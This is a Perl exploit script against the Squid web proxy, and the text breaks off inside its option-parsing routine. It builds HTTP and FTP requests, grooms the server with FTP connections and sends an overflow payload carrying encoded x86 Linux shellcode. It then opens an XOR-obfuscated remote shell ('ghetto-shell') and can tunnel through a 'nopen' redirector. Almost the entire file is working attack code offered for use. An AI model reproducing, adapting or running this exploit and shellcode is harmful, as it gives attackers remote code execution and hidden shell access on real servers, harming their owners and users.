#!/usr/bin/perl -w
use strict;
use IO::Select;
use IO::Socket;
use Getopt::Long qw(:config no_ignore_case);
use MIME::Base64;
use Sys::Hostname;

################################################################################
# Globals
################################################################################
our $target_str;	# Includes target:port to be parsed
our $listen_str;	# Includes ip:port to be parsed
our $target_ip;
our $target_port;
our $target_type;
our $delay = 30;
our $listen_ip;
our $listen_port;
our $sent;
our $proxy_auth_user;
our $proxy_auth_pass;
our $proxy_auth = "";
our $printhelp;
our @data_ports;
our $message;
our $bytes_to_read = 14096;
our $max_ftp_clients = 10;
our $ftp_alarm = 0;
our $ftp_timeout = 180;
our $sock_verify_time = 10;
our $test_http_client_tag = int(rand(6666666));
our $ftp_client_tag = int(rand(6666666));
our $http_client_tag = int(rand(6666666));
our ($fh, $i, $s_arr, @ready);
our ($listener, $sock_c, $buf_c, $sock_r, $buf_r, @sock_c, @sock_r, @sock_d);
our $test_http_client_request = "";
our $test_http_server_response = "";
our $test_ftp_client_request = "";
our $ftp_client_request = "";
our $ftp_server_response = "";
our $nasty_client_request = "";
our $nasty_server_response1 = "";
our $nasty_server_response2 = "";
our $first_shell_read = 1;

# this is set if we are redirecting through a nopen tunnel
our $nopen = 0;
our $nopen_port;
our $nopen_flag;
our $nopen_sock;
our $nopen_str;
our $nopen_forward_ip;
our $nopen_forward_port;
our $local_ip_addr;

################################################################################
# MAIN
################################################################################

# Unbuffer stdout
$| = 1;
# Setup sig pipe handler
$SIG{'PIPE'} = \&sig_pipe;

# Get and set command line options
&get_options();

# Check if using proxy authentication
if (defined $proxy_auth_user || defined $proxy_auth_pass) {
	if (!defined $proxy_auth_user) {
		print "\n--! You need to specify both the Username and Password: <user_name>:$proxy_auth_pass\n\n";
		exit;
	} elsif (!defined $proxy_auth_pass) {
		print "\n--! You need to specify both the Username and Password: $proxy_auth_user:<password>\n\n";
		exit;
	}
	$proxy_auth = encode_base64($proxy_auth_user . ':' . $proxy_auth_pass, "");
	print "\n--> Using authentication: $proxy_auth_user:$proxy_auth_pass = $proxy_auth\n";
	$proxy_auth  = "Proxy-Authorization: Basic $proxy_auth\r\n";
}

# Create the strings we will use to communicate with
&create_packet_strings();

# set up the nopen tunnel stuff, if we requested it
if($nopen) {
	&set_up_nopen();
}

# Test http connection
&test_http_connection();

# Test ftp connection
&test_ftp_connection();

# Check for continue
&check_continue("\n--> Continue exploit (y/n): ");

# Groom server with ftp connections
&groom_ftp();

# Exploit
&exploit();
 
print "-" x 80 . "

          ---===<<< ALL YOUR SQUID ARE BELONG TO US!! >>>===---
             --==<< obfuscated-comms ghetto-shell 2.0 >>==--

" . "-" x 80 . "\n\n";

# Initiate shell interface
&shell_interface();

exit;

################################################################################
# End MAIN
################################################################################

################################################################################
# Sub set_up_nopen
################################################################################
sub set_up_nopen {
	# first we need to connect a socket to control nopen
    $nopen_sock = &udp_sock_connect("127.0.0.1", $nopen_port);
	
	# then we need to set up the local socket to redirect to the remote squid
	# this will need to be changed to be dynamic
	#my $local_tunnel_string = "l 7777 $target_ip $target_port\r\n";
	# this target is the rh90 box with squid stable1-2
	my $local_tunnel_string = "l $target_port $nopen_forward_ip $nopen_forward_port ";
	syswrite($nopen_sock, $local_tunnel_string);

	sleep 2;
	syswrite($nopen_sock, "s\n");
	sleep 2;

	# then we need to set up the remote socket to forward connections back to us
	my $remote_tunnel_string = "r $listen_port $local_ip_addr $listen_port ";
	syswrite($nopen_sock, $remote_tunnel_string);
	sleep 2;
	syswrite($nopen_sock, "s\n");
}

################################################################################
# Sub safe_inet_ntoa
################################################################################
sub safe_inet_ntoa {
	my $ip_struct = (shift);
	if (!$ip_struct) {
		return "EXTRANEOUS CONNECTION: IGNORED";
	} else {
		return &inet_ntoa($ip_struct);
	}
}

################################################################################
# Sub read_sock
################################################################################
sub read_sock {
	my $sock = (shift);
	my ($line) = "";
	#recv($sock, $line, 512, 'NULL');
	recv($sock, $line, 512, 0);
	for ($i = 0; $i < length($line); $i++) {
		substr($line, $i, 1, substr($line, $i, 1)^"\x56");
	}
	if ($first_shell_read) {
		$line = &clean_line($line);
	}
	if (defined $line) {
#		if ($line ne $sent) {
			print($line);
#		}
	} else {
		print("Shit: $!\n\n");
		shutdown($sock, 2);
		exit;
	}
}

################################################################################
# Sub clean_line
################################################################################
sub clean_line {
	my $foo = (shift);
	my $len = length($foo);
	my $x = 0;
	my $char;

	for ($x = 0; $x < $len; $x++) {
		$char = unpack("C", substr($foo, $x, 1));
		if ( ($char != 9) && ($char != 10) && (( $char < 32) || ($char > 126)) ) {
			substr($foo, $x, 1, '.');
		}
	}

	return($foo);
}

################################################################################
# Sub read_input
################################################################################
sub read_input {
	my $sock = (shift);
	my $input = <STDIN>;

	#print "got input [$input]\n";
	# If we are connected to the socket, print it on the socket
	if ( $sock->connected() ) {
		$sent = $input;
		for ($i = 0; $i < length($input); $i++) {
			substr($input, $i, 1, substr($input, $i, 1)^"\x56");
		}
		syswrite($sock,"$input");
	} else {
		print("shit: $!\n");
		shutdown($sock, 2);
		exit;
	}
}

################################################################################
# Subroutine to setup a socket to communicate over
################################################################################
sub udp_sock_connect {
	my $sock;
	my $peeraddr = (shift);
	my $peerport = (shift);

	while (!($sock = IO::Socket::INET->new(
			PeerAddr => $peeraddr,
			PeerPort => $peerport,
			Proto => "udp",
			Type => SOCK_DGRAM,
			ReuseAddr => 1) ) )
    {
        #print "Cannot connect to target at $target_ip:$target_port\n".
        print "Cannot connect to target at $peeraddr:$peerport (udp)\n".
	    "Will try to continue indefinitely.\n\n";
		sleep 1;
	}
	return $sock;
}
################################################################################
# Subroutine to setup a socket to communicate over
################################################################################
sub sock_connect {
	my $sock;
	my $peeraddr = (shift);
	my $peerport = (shift);

	while (!($sock = IO::Socket::INET->new(
			PeerAddr => $peeraddr,
			PeerPort => $peerport,
			Proto => "tcp",
			Type => SOCK_STREAM,
			ReuseAddr => 1) ) )
    {
        #print "Cannot connect to target at $target_ip:$target_port\n".
        print "Cannot connect to target at $peeraddr:$peerport\n".
	    "Will try to continue indefinitely.\n\n";
		sleep 1;
	}
	return $sock;
}

################################################################################
# Subroutine to setup a socket to communicate over
################################################################################
sub sock_listen {
	my $listener;
	while (!($listener = IO::Socket::INET->new(
					Listen => 50,
					LocalPort => $listen_port,
					Proto => "tcp",
					Type => SOCK_STREAM,
					Reuse => 1) ) )
	{
		#print "Cannot create listener on port $target_port\n".
		print "Cannot create listener on port $listen_port\n".
			"Will try to continue indefinitely.\n\n";
		sleep 1;
	}
	return $listener;
}

################################################################################
# Subroutine to read the response on a socket
################################################################################
sub sock_read {
	my ($buf, $bytes_read, @reply, $y, $x);
	my ($sock) = (shift);
	if (!defined $sock) {
		print "--! Socket is no longer connected\n";
	}
	$bytes_read = sysread($sock, $buf, $bytes_to_read);
	if (defined $bytes_read && ($bytes_read > 0)) {
		$buf = &clean_line($buf);
		printf "--> received $bytes_read bytes from %s\n", &safe_inet_ntoa($sock->peeraddr);
	} elsif (defined $bytes_read && ($bytes_read < 0)) {
		print "--> Sysread error: $!\n";
	} else {
		#print "--------------------------Nothing to read--------------------------\n";
	}
	return $buf;
}

################################################################################
# Subroutine to read the response on a socket
################################################################################
sub sock_read_quiet {
	my ($buf, $bytes_read, @reply, $y, $x);
	my ($sock) = (shift);
	if (!defined $sock) {
		print "--! Socket is no longer connected\n";
	}
	$bytes_read = sysread($sock, $buf, $bytes_to_read);
	if (defined $bytes_read && ($bytes_read > 0)) {
		#printf "--> received $bytes_read bytes from %s\n", &safe_inet_ntoa($sock->peeraddr);
	} elsif (defined $bytes_read && ($bytes_read < 0)) {
		print "--> Sysread error: $!\n";
	} else {
		#print "--------------------------Nothing to read--------------------------\n";
	}
	return $buf;
}

################################################################################
# Subroutines to handle signals
################################################################################
sub sig_pipe {
	#print "\n--! SIGPIPE received\n";
}
sub sig_alrm_ftp {
	print "\n--! SIGALRM on ftp sessions...waiting too long\n";
	$ftp_alarm = 1;
}
sub sig_alrm_test {
	print "\n--! SIGALRM on test session...waiting too long\n";
	&check_response();
}

################################################################################
# Sub check_response - Look for data on connection to Squid
################################################################################
sub check_response {
	my $buf =  &sock_read($sock_c);
	if (length($buf) > 0) {
		print "--> Hmmm, looks like we have a response from our request already:\n";
		print "-" x 80 . "\n" . substr($buf,0,512) . "\n" . "-" x 80 . "\n";
		&check_continue("\n--> Continue exploit (y/n): ");
	}
}

################################################################################
# Sub create_packet_strings
################################################################################
sub create_packet_strings {

$test_http_client_request =
"GET http://$listen_ip:$listen_port/$test_http_client_tag.gif HTTP/1.1\r
Accept: */*\r
Accept-Language: zh-cn\r
Accept-Encoding: gzip, deflate\r
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r
" . $proxy_auth .
"Host: $listen_ip:$listen_port\r
Proxy-Connection: Keep-Alive\r
\r
";

$test_http_server_response =
"HTTP/1.1 400 Bad Request\r
Server: Microsoft-IIS/5.0\r
Content-Type: text/html\r
Content-Length: 87\r
\r
<html><head><title>Error</title></head><body>The parameter is incorrect. </body></html>";

$test_ftp_client_request =
"GET ftp://$listen_ip:$listen_port/ HTTP/1.0\r
User-Agent: Microsoft(r) Windows(tm) FTP Folder\r
" . $proxy_auth .
"Host: $listen_ip:$listen_port\r
\r
";

$ftp_server_response = "220 hello Microsoft Ftp Service\r\n";

$ftp_client_request =
"PUT ftp://$listen_ip:$listen_port/$ftp_client_tag.gif HTTP/1.0\r
" . $proxy_auth .
"Host: $listen_ip:$listen_port\r
Content-Length: 19242\r
\r
\r
JgKgOGGeKgCfOHKeOgOgKICfKOIeOHBeJOFgGeOCJeHKHfNHFNJfJeOeKfBeKGJFFfOeOfCgKeN";

$nasty_client_request =
"GET http://$listen_ip:$listen_port/$http_client_tag.gif HTTP/1.0\r\n" .
$proxy_auth .
"\x5a\x3a\x20\x4f\x67\x48\x67\x43\x67" .
"\x4f\x66\x48\x67\x49\x66\x4b\x67\x4f\x67\x43\x67\x4b\x67\x47\x65" .
"\x46\x66\x46\x67\x4b\x67\x43\x65\x48\x67\x49\x65\x42\x66\x4e\x67" .
"\x48\x67\x43\x65\x42\x66\x4f\x67\x47\x67\x47\x66\x42\x65\x47\x65" .
"\x42\x65\x4f\x65\x47\x65\x48\x66\x4a\x65\x4f\x65\x42\x67\x4b\x67" .
"\x4f\x67\x4f\x67\x42\x65\x4f\x66\x43\x65\x47\x67\x4b\x67\x4f\x67" .
"\x48\x66\x4f\x66\x47\x66\x49\x66\x4f\x65\x49\x66\x47\x66\x4b\x67" .
"\x46\x66\x49\x65\x43\x67\x47\x67\x43\x65\x47\x66\x4e\x65\x42\x65" .
"\x4b\x67\x4f\x65\x4a\x66\x4a\x65\x46\x66\x43\x67\x4a\x65\x47\x65" .
"\x48\x67\x43\x67\x49\x67\x4f\x67\x46\x67\x4f\x67\x4a\x67\x42\x67" .
"\x46\x67\x4b\x65\x46\x65\x48\x66\x4a\x66\x48\x66\x43\x66\x4b\x67" .
"\x42\x66\x47\x66\x4b\x65\x4a\x67\x49\x66\x43\x67\x48\x66\x4a\x66" .
"\x46\x65\x43\x67\x43\x65\x4a\x67\x48\x66\x4b\x65\x4b\x67\x42\x67" .
"\x4a\x67\x47\x67\x4e\x65\x4b\x65\x42\x65\x47\x67\x4f\x67\x4f\x66" .
"\x48\x65\x48\x67\x4f\x66\x4f\x67\x4a\x66\x4f\x67\x4b\x67\x43\x66" .
"\x47\x66\x48\x65\x43\x67\x4b\x67\x4e\x65\x42\x65\x4a\x66\x47\x66" .
"\x42\x67\x46\x66\x49\x66\x47\x66\x4e\x65\x4a\x67\x4f\x65\x47\x67" .
"\x47\x67\x4b\x67\x48\x67\x48\x66\x48\x65\x47\x65\x42\x66\x49\x65" .
"\x4b\x67\x4f\x67\x48\x66\x49\x67\x4a\x67\x46\x66\x4f\x66\x4a\x67" .
"\x47\x65\x4b\x65\x42\x67\x4f\x66\x4e\x66\x49\x67\x42\x66\x4e\x66" .
"\x4f\x67\x4e\x67\x47\x66\x46\x65\x42\x66\x4a\x66\x4a\x67\x49\x65" .
"\x43\x65\x4b\x65\x43\x66\x4f\x66\x47\x65\x49\x65\x46\x65\x47\x66" .
"\x42\x65\x48\x67\x42\x66\x4f\x66\x47\x66\x46\x65\x47\x67\x43\x65" .
"\x49\x67\x47\x66\x4b\x67\x48\x65\x4b\x67\x42\x66\x4b\x65\x47\x66" .
"\x42\x65\x43\x66\x48\x65\x4b\x67\x4b\x67\x47\x65\x46\x65\x47\x65" .
"\x4b\x67\x49\x67\x4e\x67\x4f\x67\x4a\x65\x46\x66\x48\x66\x42\x65" .
"\x4b\x66\x4e\x67\x42\x67\x42\x65\x42\x66\x4b\x67\x46\x67\x47\x65" .
"\x46\x66\x4e\x66\x4a\x67\x47\x65\x47\x66\x47\x65\x48\x67\x46\x66" .
"\x4b\x66\x48\x67\x46\x67\x4e\x66\x4e\x65\x48\x66\x42\x65\x47\x67" .
"\x42\x67\x46\x67\x4b\x67\x49\x65\x4e\x67\x42\x66\x47\x65\x4e\x67" .
"\x4f\x66\x46\x65\x47\x65\x4b\x65\x43\x65\x43\x65\x4e\x66\x43\x67" .
"\x4b\x65\x46\x66\x49\x67\x4b\x66\x43\x67\x4f\x66\x4e\x66\x4e\x66" .
"\x46\x65\x48\x65\x47\x65\x43\x66\x42\x66\x48\x67\x47\x67\x46\x65" .
"\x47\x65\x48\x66\x46\x66\x48\x66\x48\x66\x48\x65\x48\x67\x49\x66" .
"\x46\x66\x4a\x66\x42\x65\x46\x65\x48\x65\x4e\x66\x4e\x65\x4b\x67" .
"\x48\x65\x46\x65\x4f\x67\x4b\x65\x4f\x66\x42\x67\x46\x65\x48\x67" .
"\x43\x65\x42\x66\x46\x65\x4a\x65\x4f\x66\x4a\x67\x43\x66\x49\x66" .
"\x4a\x66\x48\x67\x4b\x67\x4b\x67\x4f\x66\x4a\x67\x4b\x66\x4a\x66" .
"\x4b\x67\x4b\x66\x48\x67\x49\x66\x43\x65\x42\x67\x46\x67\x43\x65" .
"\x4f\x66\x49\x67\x42\x67\x42\x67\x4a\x67\x48\x66\x4a\x65\x49\x66" .
"\x46\x65\x4f\x66\x49\x67\x4f\x65\x46\x67\x4f\x67\x47\x66\x4a\x67" .
"\x48\x67\x4a\x67\x4f\x65\x48\x65\x49\x66\x43\x67\x46\x65\x48\x65" .
"\x47\x65\x4f\x66\x49\x66\x46\x67\x49\x67\x49\x65\x4b\x65\x4e\x67" .
"\x42\x66\x4e\x66\x4a\x67\x42\x67\x4b\x67\x49\x65\x4b\x67\x4f\x67" .
"\x43\x67\x4b\x67\x46\x65\x4a\x65\x42\x67\x4f\x65\x42\x67\x4f\x67" .
"\x46\x67\x49\x65\x4b\x65\x43\x65\x48\x67\x47\x65\x43\x66\x48\x66" .
"\x4f\x67\x49\x65\x47\x65\x46\x66\x4e\x67\x49\x67\x4b\x67\x42\x66" .
"\x4e\x67\x47\x65\x43\x67\x43\x65\x49\x67\x49\x66\x42\x65\x46\x67" .
"\x42\x67\x48\x66\x49\x66\x46\x65\x4a\x67\x4e\x67\x4a\x66\x48\x66" .
"\x42\x66\x47\x66\x49\x67\x4f\x65\x48\x66\x4f\x67\x42\x65\x4e\x67" .
"\x4a\x67\x47\x65\x43\x65\x4e\x66\x4f\x65\x47\x67\x46\x67\x46\x67" .
"\x42\x65\x4a\x66\x4a\x66\x43\x65\x47\x65\x46\x66\x43\x66\x43\x66" .
"\x4e\x67\x43\x66\x4f\x67\x48\x67\x46\x66\x4f\x65\x42\x65\x4e\x65" .
"\x4e\x66\x4a\x67\x49\x67\x4f\x66\x4e\x67\x49\x66\x4f\x66\x4a\x66" .
"\x47\x67\x42\x67\x4e\x65\x4a\x67\x43\x65\x4e\x67\x4e\x65\x43\x65" .
"\x4e\x67\x47\x66\x4e\x65\x42\x65\x43\x66\x46\x66\x49\x66\x4f\x66" .
"\x4f\x67\x49\x65\x43\x67\x43\x66\x4a\x67\x46\x65\x43\x65\x43\x67" .
"\x42\x65\x48\x67\x47\x66\x4b\x66\x47\x66\x4e\x67\x43\x65\x49\x66" .
"\x43\x67\x4f\x66\x48\x67\x43\x67\x4a\x65\x4f\x65\x4a\x66\x42\x65" .
"\x46\x66\x4e\x67\x46\x65\x48\x67\x43\x65\x48\x67\x4a\x65\x4b\x66" .
"\x48\x66\x4b\x66\x43\x65\x4f\x66\x4f\x67\x48\x65\x46\x67\x4e\x65" .
"\x4e\x67\x47\x65\x49\x66\x4f\x65\x4f\x65\x46\x66\x46\x65\x47\x66" .
"\x48\x67\x42\x66\x48\x66\x48\x65\x4b\x65\x47\x65\x48\x67\x42\x65" .
"\x42\x65\x4e\x65\x4b\x66\x48\x67\x4e\x66\x42\x67\x4f\x65\x42\x67" .
"\x4e\x67\x4a\x66\x4b\x66\x4f\x65\x4f\x65\x4b\x66\x4e\x66\x4a\x65" .
"\x4f\x66\x46\x67\x4a\x65\x47\x67\x4a\x67\x4f\x67\x4a\x65\x4f\x65" .
"\x43\x65\x42\x67\x48\x67\x4f\x66\x49\x67\x4b\x67\x4b\x66\x47\x66" .
"\x4b\x67\x4e\x66\x4e\x65\x4f\x65\x4f\x65\x43\x65\x49\x65\x46\x65" .
"\x4b\x67\x43\x65\x4b\x65\x4f\x66\x4f\x66\x4b\x65\x42\x65\x4b\x66" .
"\x47\x65\x47\x67\x48\x65\x47\x67\x4f\x66\x4f\x66\x46\x67\x48\x66" .
"\x46\x65\x48\x67\x43\x66\x4b\x67\x4f\x67\x49\x67\x42\x65\x46\x65" .
"\x47\x67\x42\x65\x46\x66\x42\x67\x4e\x67\x4e\x65\x48\x67\x47\x67" .
"\x46\x66\x48\x67\x48\x67\x4b\x65\x48\x67\x49\x65\x42\x65\x47\x65" .
"\x4e\x65\x4f\x67\x49\x67\x43\x65\x46\x65\x4f\x67\x4a\x65\x4b\x66" .
"\x4f\x65\x4f\x65\x43\x67\x42\x65\x48\x66\x48\x65\x47\x65\x46\x65" .
"\x4b\x67\x48\x67\x46\x65\x49\x67\x42\x65\x47\x67\x4f\x67\x42\x66" .
"\x46\x66\x43\x66\x43\x66\x4e\x66\x43\x67\x42\x66\x42\x66\x4f\x67" .
"\x4a\x66\x4e\x66\x4f\x66\x4e\x67\x48\x67\x4f\x66\x4e\x66\x46\x66" .
"\x43\x65\x4b\x67\x46\x67\x43\x65\x4e\x67\x4b\x66\x42\x65\x4b\x65" .
"\x46\x67\x4e\x66\x47\x66\x4b\x66\x49\x67\x4a\x66\x48\x66\x47\x65" .
"\x48\x67\x4b\x67\x49\x67\x4f\x66\x47\x65\x4e\x66\x46\x67\x49\x67" .
"\x49\x65\x47\x67\x4b\x65\x46\x66\x42\x66\x4e\x66\x4e\x65\x43\x66" .
"\x4e\x67\x43\x66\x47\x66\x48\x65\x47\x66\x4f\x67\x42\x66\x42\x66" .
"\x42\x65\x43\x67\x47\x65\x43\x65\x48\x67\x47\x66\x4b\x66\x42\x66" .
"\x4f\x65\x4f\x67\x49\x67\x4b\x66\x4e\x66\x4b\x67\x49\x67\x49\x66" .
"\x49\x66\x43\x65\x4f\x66\x4f\x66\x4b\x66\x49\x67\x48\x65\x48\x67" .
"\x4a\x67\x4a\x67\x4e\x65\x4b\x66\x46\x67\x47\x66\x47\x66\x43\x67" .
"\x46\x67\x4e\x66\x48\x66\x49\x65" .
"\x48\x66\x4f\x66\x48\x66\x49\x67\x4a\x65\x48\x65\x47\x67\x4b\x66" .
"\x46\x66\x48\x65\x4e\x67\x4f\x67\x46\x65\x4a\x67\x42\x66\x43\x65" .
"\x4e\x67\x49\x66\x42\x66\x4b\x67\x4a\x67\x48\x66\x43\x66\x43\x65" .
"\x43\x65\x42\x67\x47\x67\x46\x67\x4a\x67\x42\x66\x47\x66\x4e\x66" .
"\x4a\x67\x47\x65\x48\x67\x4b\x65\x49\x67\x4e\x67\x43\x65\x4a\x66" .
"\x43\x65\x46\x65\x42\x67\x4f\x66\x49\x65\x46\x66\x4f\x66\x4a\x66" .
"\x42\x67\x43\x66\x4e\x67\x4f\x65\x4b\x67\x49\x66\x4a\x67\x43\x65" .
"\x46\x65\x48\x65\x4b\x67\x43\x67\x4e\x67\x42\x65\x4a\x66\x4a\x66" .
"\x49\x66\x4a\x65\x49\x66\x47\x67\x49\x67\x46\x66\x4a\x65\x4a\x65" .
"\x48\x67\x4a\x65\x4a\x67\x47\x65\x42\x67\x4e\x66\x47\x66\x47\x66" .
"\x43\x67\x4b\x66\x46\x66\x43\x67\x4a\x66\x42\x67\x4b\x67\x4f\x67" .
"\x48\x65\x4e\x67\x49\x65\x47\x66\x4b\x67\x4f\x67\x46\x66\x42\x66" .
"\x43\x66\x4f\x65\x4f\x65\x4b\x66\x4b\x66\x49\x67\x46\x65\x4f\x65" .
"\x48\x65\x4a\x67\x48\x65\x49\x66\x4b\x67\x47\x66\x4b\x67\x43\x66" .
"\x46\x67\x4a\x65\x47\x65\x46\x66\x47\x65\x48\x66\x48\x67\x4f\x66" .
"\x4b\x67\x49\x67\x4b\x66\x43\x66\x42\x65\x4a\x65\x42\x67\x4b\x67" .
"\x4a\x65\x42\x66\x4a\x66\x48\x66\x46\x67\x42\x67\x42\x65\x4a\x65" .
"\x4b\x65\x49\x67\x42\x66\x46\x66\x48\x65\x4f\x67\x47\x66\x48\x66" .
"\x4e\x65\x42\x66\x46\x67\x46\x66\x43\x65\x4b\x65\x43\x66\x43\x65" .
"\x47\x65\x4a\x66\x46\x67\x46\x66\x4a\x67\x46\x67\x46\x67\x46\x67" .
"\x49\x67\x4e\x66\x4b\x65\x47\x65\x4e\x67\x49\x65\x46\x67\x49\x65" .
"\x4e\x66\x4f\x67\x4b\x65\x43\x66\x4e\x67\x47\x67\x4a\x65\x46\x65" .
"\x48\x66\x4a\x65\x43\x65\x46\x65\x4b\x66\x42\x65\x46\x66\x4b\x66" .
"\x47\x67\x47\x67\x4f\x67\x4e\x67\x49\x67\x42\x66\x47\x67\x49\x66" .
"\x4e\x65\x4f\x66\x48\x66\x42\x65\x4a\x66\x4a\x65\x49\x65\x47\x66" .
"\x43\x67\x4b\x65\x46\x66\x4b\x66\x47\x67\x4e\x66\x48\x65\x49\x65" .
"\x42\x67\x4b\x66\x48\x65\x4a\x67\x48\x66\x46\x66\x4b\x65\x4a\x66" .
"\x46\x67\x4a\x67\x42\x65\x4f\x67\x4a\x67\x43\x67\x48\x65\x43\x67" .
"\x46\x66\x49\x65\x49\x65\x49\x65\x4b\x67\x42\x65\x4f\x66\x47\x65" .
"\x4b\x67\x42\x65\x42\x66\x48\x66\x42\x67\x47\x67\x4f\x66\x42\x67" .
"\x47\x65\x4a\x67\x47\x65\x42\x67\x43\x65\x46\x67\x47\x65\x48\x65" .
"\x4a\x66\x42\x66\x4b\x65\x49\x65\x4a\x65\x48\x66\x46\x67\x49\x65" .
"\x4a\x65\x49\x66\x49\x67\x4a\x65\x4b\x66\x4f\x67\x4b\x66\x4f\x67" .
"\x49\x65\x42\x67\x49\x66\x46\x65\x4e\x67\x4a\x65\x46\x67\x4b\x65" .
"\x4e\x65\x46\x66\x42\x66\x46\x66\x49\x65\x4e\x67\x4f\x65\x48\x67" .
"\x49\x66\x4f\x65\x43\x65\x4f\x66\x4a\x65\x4b\x66\x49\x66\x46\x67" .
"\x42\x66\x4e\x67\x43\x66\x42\x67\x47\x67\x4e\x67\x48\x66\x47\x67" .
"\x43\x67\x4a\x65\x4e\x66\x42\x67\x4a\x66\x47\x67\x49\x65\x46\x65" .
"\x46\x67\x47\x66\x43\x65\x4f\x65\x4f\x67\x46\x66\x43\x67\x4b\x65" .
"\x4b\x67\x49\x67\x4f\x66\x4f\x65\x42\x66\x43\x65\x46\x66\x4e\x67" .
"\x4e\x67\x49\x67\x42\x65\x4a\x65\x46\x66\x43\x66\x42\x65\x47\x65" .
"\x46\x65\x42\x65\x49\x65\x4f\x65\x42\x67\x4b\x66\x48\x66\x4f\x67" .
"\x43\x67\x43\x65\x4b\x65\x48\x67\x48\x67\x4f\x67\x4a\x66\x48\x65" .
"\x4e\x67\x42\x66\x42\x65\x4f\x67\x4e\x66\x48\x65\x47\x67\x4e\x67" .
"\x43\x65\x4e\x67\x42\x4f\x0d\x0a\x47\x65\x4f\x4f\x4a\x4f\x4a\x42" .
"\x47\x67\x4b\x49\x46\x42" .
"\xf0\xff\xff\xff\xf8\xff\xff\xff\x10\x73\x0f\x08\x60\x22\x13\x08" x 200 .
#"\xf0\xff\xff\xff\xf8\xff\xff\xff\xc0\x6f\x0c\x08\x02\x0e\x10\x08" x 200 . # Target type 1
"\x3a\x20\x59\x0d\x0a\x0d\x0a\x0d\x0a";

$nasty_server_response1 =
"HTTP/1.1 200 OK
Cache-control: public
Content-Type: text/html
Server: Apache/2.0.40 (Red Hat Linux)
Date: Wed, 30 Jan 2009 12:34:54 GMT
Connection: close
Last-Modified: Wed, 30 Jan 2009 12:34:54 GMT
Vary: Z
Vary: Z
Vary: Z
Vary: Z
Vary: Z
Vary: GeOOJOJBGgKIFB" .
"\xf0\xff\xff\xff\xf8\xff\xff\xff\x10\x73\x0f\x08\x60\x22\x13\x08" x 200 .
#"\xf0\xff\xff\xff\xf8\xff\xff\xff\xc0\x6f\x0c\x08\x02\x0e\x10\x08" x 200 . # Target type 1
"\n" .
"Vary: Z\n" x 26 .
"\xeb\x0e\x47\x4a\x4f\x4b\x4e\x46\x4e\x46\x49\x67\x42\x66\x49\x66" .
"\x47\x4a\x43\x47\x43\x41";

$nasty_server_response2 =
"\x43\x40\x46\x43\x47\x43\xeb\x06\x47\x43\x41\x43\x40\x46\x43\x47" .
"\x43\x41\x43\x40\x46\x43\x47\x43\x41\x43\x40\x46\x43\x31\xdb\x31" .
"\xc9\x31\xd2\x31\xc0\xb0\xa4\xcd\x80\x6a\x02\x58\xcd\x80\x31\xdb" .
"\x39\xd8\x74\x13\x89\xc3\x31\xc9\x31\xd2\x6a\x07\x58\xcd\x80\x31" .
"\xdb\x6a\x01\x58\x4b\xcd\x80\x6a\x02\x58\xcd\x80\x31\xdb\x39\xd8" .
"\x74\x02\xeb\xeb\x31\xdb\x66\xbb\x18\x01\x01\xe3\x8b\x1b\x31\xc9" .
"\x6a\x3f\x58\xcd\x80\x6a\x28\x59\x6a\x03\x5b\x6a\x06\x58\xcd\x80" .
"\x43\x39\xcb\x7e\xf6\x81\xc4\xf8\xff\xff\xff\x54\x31\xdb\x53\x43" .
"\x53\x53\x89\xe1\x6a\x08\x5b\x6a\x66\x58\xcd\x80\x81\xec\xf0\xff" .
"\xff\xff\x6a\x02\x58\xcd\x80\x31\xdb\x39\xd8\x75\x47\x31\xdb\x6a" .
"\x06\x58\xcd\x80\x5b\x6a\x06\x58\xcd\x80\xbf\x56\x56\x56\x56\x5b" .
"\x6a\x03\x59\x6a\x3f\x58\x49\xcd\x80\x41\xe2\xf7\x31\xd2\xbb\x7b" .
"\x3f\x56\x56\x31\xfb\x53\x89\xe1\xbb\x79\x25\x3e\x56\x31\xfb\x53" .
"\xbb\x79\x34\x3f\x38\x31\xfb\x53\x89\xe3\x52\x51\x53\x89\xe1\x6a" .
"\x0b\x58\xcd\x80\xeb\x46\x60\x81\xc4\x60\xf0\xff\xff\x31\xd2\x66" .
"\xba\xa0\x0f\x89\xe1\x89\xf3\x6a\x03\x58\xcd\x80\x89\xc2\xeb\x23" .
"\x59\x8b\x19\x31\xc9\x8d\x04\x8c\x31\x18\x41\x66\x81\xf9\xe8\x03" .
"\x7c\xf3\x89\xfb\x89\xe1\x6a\x04\x58\xcd\x80\x81\xec\x60\xf0\xff" .
"\xff\x61\xc3\xe8\xd8\xff\xff\xff\x56\x56\x56\x56\x5f\x5b\x6a\x06" .
"\x58\xcd\x80\x31\xf6\x89\xe5\x6a\x01\x5a\x52\x57\x52\x56\xba\xff" .
"\xff\xff\xff\x6a\x02\x59\x89\xe3\x31\xc0\xb0\xa8\xcd\x80\x58\x58" .
"\xc1\xe8\x10\x89\xc2\x24\x01\x74\x05\xe8\x88\xff\xff\xff\x80\xe2" .
"\x18\x75\x1b\x58\x58\xc1\xe8\x10\x89\xc2\x24\x01\x74\x09\x87\xfe" .
"\xe8\x71\xff\xff\xff\x87\xfe\x80\xe2\x18\x75\x02\xeb\xb9\x31\xdb" .
"\x6a\x06\x58\xcd\x80\xe9\xb5\xfe\xff\xff\x0d\x0a\x0d\x0a\x0d\x0a";

}

################################################################################
# Sub get_options
################################################################################
sub get_options {

	GetOptions ('target|t=s'		=> \$target_str,
				'listen|l=s'		=> \$listen_str,
				'target-type|o=i'	=> \$target_type, 
				'delay|d=i'			=> \$delay,
				'proxy-user|U=s'	=> \$proxy_auth_user,
				'proxy-pass|P=s'	=> \$proxy_auth_pass,
				'help|h'			=> \$printhelp,
				'nopen|n=i'			=> \$nopen_port,
				'nopen_forward|f=s'	=> \$nopen_str,
				'local-addr|a=s'	=> \$local_ip_addr
	);

	($target_ip, $target_port) = split(/:/, $target_str);
	($listen_ip, $listen_port) = split(/:/, $listen_str);
	if(defined($nopen_str)) {
		($nopen_forward_ip, $nopen_forward_port) = split(/:/, $nopen_str);
	}
	
	# Print help if they want it
	if ($printhelp) {&print_usage();}

	if($nopen_port) {$nopen = 1;}
	if($nopen && (!defined($nopen_forward_ip) || !defined($nopen_forward_port))) {
		&print_usage("You forgot -f <ip:port>");
	}
	if($nopen && (!defined($local_ip_addr))) {
		&print_usage("You forgot -a <local ip addr>");
	}
	#print "nopen [$nopen] nopen port [$nopen_port]";
	
	if (!defined($target_ip)) { &print_usage("You missed -t <ip:port>"); }
	if (!defined($target_port)) { &print_usage("You missed -t <ip:PORT>"); }
	if (!defined($delay)) { &print_usage("You missed -d <delay>"); }
	if (!defined($listen_ip)) { &print_usage("You missed -l <ip:port>"); }
